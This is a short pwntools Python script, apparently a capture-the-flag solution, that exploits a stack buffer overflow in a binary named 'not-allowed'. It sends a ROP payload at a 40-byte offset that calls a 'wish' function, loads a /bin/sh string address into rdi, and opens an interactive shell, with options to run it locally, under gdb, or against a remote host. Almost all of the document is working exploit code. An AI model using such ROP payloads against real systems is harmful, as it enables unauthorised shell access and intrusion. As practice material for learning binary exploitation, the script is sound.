#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './not-allowed' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '', 1337 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break main
break wish
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    # call wish first to get binsh at addr: 0x40407d
    binsh = 0x40407d
    pop_rdi = 0x401156
    
    offset = 40
    payload = flat({
        offset: [
            elf.sym['wish'],
            pop_rdi,
            binsh,
            elf.sym['main']
        ]
    })

    io.sendline(payload)
    
    io.sendline(b'\x15')
    io.interactive()
    
if __name__ == '__main__':
    exploit()